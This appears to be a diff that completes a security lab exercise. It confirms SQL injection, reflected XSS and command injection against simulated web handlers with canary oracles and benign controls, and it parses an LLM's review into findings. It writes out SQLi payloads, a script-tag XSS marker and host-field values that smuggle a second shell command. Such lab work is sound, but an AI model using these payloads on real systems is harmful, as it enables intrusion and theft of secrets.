@@ -18,11 +18,14 @@ to test; see ../../resources/ethics-and-scope.md.
 
 from __future__ import annotations
 
-from seclab.attack import Payload, Finding, run_payloads, contains_oracle
-from seclab.scan import ScanResult
+import json
+import re
 
 from webharness import (login_send, reflect_send, reflect_safe_send, ping_send,
                         RULE_ALIASES)
+
+from seclab.attack import Payload, Finding, run_payloads, contains_oracle
+from seclab.scan import ScanResult
 
 
 # ============================================================================
@@ -48,9 +51,15 @@ def confirm_sqli() -> list[Finding]:
 
     Return the list of Findings.
     """
-    # TODO: build the payloads (incl. a benign control) and run_payloads with a
-    #       canary oracle; return the Findings.
-    raise NotImplementedError
+    payloads = [
+        Payload("admin' OR '1'='1", "authentication bypass", "sqli"),
+        Payload("admin'--", "comment out the password check", "sqli"),
+        Payload("' UNION SELECT user, secret FROM users--",
+                "extract secrets with UNION", "sqli"),
+        Payload("alice", "real user with the wrong password", "benign"),
+    ]
+    return run_payloads(payloads, send=login_send,
+                        oracle=contains_oracle("FLAG-sqli-"), trials=5)
 
 
 def confirm_xss() -> tuple[Finding, Finding]:
@@ -69,10 +78,23 @@ def confirm_xss() -> tuple[Finding, Finding]:
     reuse ``contains_oracle`` here (the payload IS the marker, so it would confirm
     mere reflection — the exact false positive this task is about).
     """
-    # TODO: define xss_oracle (unescaped <script> present), pick a marker payload
-    #       such as "<script>alert('XSS-FIRED-7f3a')</script>", run it against
-    #       reflect_send and reflect_safe_send, and return (vuln_f, safe_f).
-    raise NotImplementedError
+    payload = Payload("<script>alert('XSS-FIRED-7f3a')</script>",
+                      "unescaped script in the HTML body", "xss")
+    vuln_f = run_payloads([payload], send=reflect_send,
+                          oracle=xss_oracle, trials=5)[0]
+    safe_f = run_payloads([payload], send=reflect_safe_send,
+                          oracle=xss_oracle, trials=5)[0]
+    return vuln_f, safe_f
+
+
+def xss_oracle(payload: Payload, response: str) -> tuple[bool, str]:
+    """Check the script survives in this lab's HTML body, without decoding it.
+
+    This checks an execution prerequisite; it does not run a browser.
+    """
+    hit = (re.search(r"<script\b[^>]*>", payload.text, re.IGNORECASE) is not None
+           and payload.text in response)
+    return hit, "unescaped script payload in HTML body" if hit else ""
 
 
 def confirm_cmdi() -> list[Finding]:
@@ -86,9 +108,18 @@ def confirm_cmdi() -> list[Finding]:
     Include a benign control (a plain host with no metacharacters) that must NOT
     confirm. Return the Findings.
     """
-    # TODO: define cmdi_oracle (json injection_detected True), build payloads incl.
-    #       a benign control, run_payloads with ping_send, return the Findings.
-    raise NotImplementedError
+    def cmdi_oracle(payload: Payload, response: str) -> tuple[bool, str]:
+        data = json.loads(response)
+        hit = data.get("injection_detected") is True
+        return hit, "simulator detected shell metacharacters" if hit else ""
+
+    payloads = [
+        Payload("127.0.0.1; echo CMDI-FIRED", "semicolon separator", "cmdi"),
+        Payload("127.0.0.1 && echo CMDI-FIRED", "conditional command", "cmdi"),
+        Payload("127.0.0.1 | echo CMDI-FIRED", "pipeline", "cmdi"),
+        Payload("127.0.0.1", "plain loopback host", "benign"),
+    ]
+    return run_payloads(payloads, send=ping_send, oracle=cmdi_oracle, trials=5)
 
 
 # ============================================================================
@@ -117,9 +148,23 @@ def parse_llm_review(raw: str) -> list[ScanResult]:
     its Broken-Access-Control claim and its finding on ``do_reflect_safe``. Whether
     those are real is decided by scoring against the ground truth, not by you.
     """
-    # TODO: scan each line for a RULE_ALIASES key and a do_<name> location; emit a
-    #       ScanResult per finding. Return the list.
-    raise NotImplementedError
+    findings = []
+    # Prefer the longer alias so "reflected xss" produces just one finding.
+    aliases = sorted(RULE_ALIASES, key=len, reverse=True)
+    for line in raw.splitlines():
+        location = re.search(r"\bdo_\w+\b", line, re.IGNORECASE)
+        if location is None:
+            continue
+        for alias in aliases:
+            if re.search(r"\b" + re.escape(alias) + r"\b", line, re.IGNORECASE):
+                severity = re.search(r"\[(HIGH|MEDIUM|LOW|CRITICAL|INFO)\]",
+                                     line, re.IGNORECASE)
+                findings.append(ScanResult(
+                    rule=RULE_ALIASES[alias], location=location.group(),
+                    severity=severity.group(1).lower() if severity else "unknown",
+                    tool="llm", raw=line.strip()))
+                break
+    return findings
 
 
 # ============================================================================
